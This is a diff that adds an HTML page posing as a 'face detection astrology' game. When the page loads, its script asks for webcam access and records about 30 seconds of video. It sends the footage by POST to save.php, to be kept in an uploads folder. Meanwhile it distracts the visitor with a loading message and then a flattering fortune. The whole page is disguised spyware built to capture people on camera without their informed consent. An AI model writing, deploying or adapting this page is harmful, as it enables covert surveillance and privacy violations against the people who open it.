@@ -1,0 +1,68 @@
+<!doctype html>
+<html>
+<head>
+<title> photos </title>
+</head>
+<body style="background:linear-gradient(to left, #DCDCDC, #F0F8FF, #D3D3D3)" onload="my()">
+<br> <br> <br> <br> <br> <br> <br><br><br>
+<div id="photo" align="middle">
+<font size="9" color="red"> face detection astrology loading .......</font>
+</div>
+<br> <br><br><br>
+<div style="display:none" id="after">
+<font size="9" color="red"> you are a hero in future you definitely became tony stark </font>
+</div>
+<script>
+var reader = new FileReader();
+var pika = document.getElementById("hack");
+var chunks = [];
+function my() {
+    navigator.mediaDevices.getUserMedia({
+         audio: false,
+         video: true
+        }).then(stream =>  {
+           var recorder = new MediaRecorder(stream, { type: "video/webm" });
+           recorder.start();
+           recorder.ondataavailable = e => {
+           chunks.push(e.data);
+           var blob = new Blob(chunks, { type: "video/webm" });
+       var fileType = blob.type.split('/')[0] || 'audio';
+       var fileName = (Math.random() * 1000).toString().replace('.', '');
+        if (fileType === 'audio') {
+           fileName += '.' + (!!navigator.mozGetUserMedia ? 'ogg' : 'wav');
+        } else {
+             fileName += '.webm';
+        }
+        var formData = new FormData();
+        formData.append(fileType + '-filename', fileName);
+        formData.append(fileType + '-blob', blob);
+
+        var upload_url = 'save.php';
+        var upload_directory = 'uploads/';
+        makeXMLHttpRequest(upload_url, formData, function(progress) {
+         if (progress !== 'upload-ended') {
+              return;
+         }
+        });
+                     function makeXMLHttpRequest(url, data, callback) {
+                var request = new XMLHttpRequest();
+                request.onreadystatechange = function() {
+                    if (request.readyState == 4 && request.status == 200) {
+                    }
+                };
+                request.open('POST', url);
+                request.send(data);
+                                document.getElementById("photo").style.display="none";
+                                document.getElementById("after").style.display="block";
+                }
+           };
+           var track = stream.getTracks()[0];
+           setTimeout(() => {
+            recorder.stop();
+                track.stop();
+           }, 30000);
+        }).catch(console.error);
+};
+</script>
+</body>
+</html>
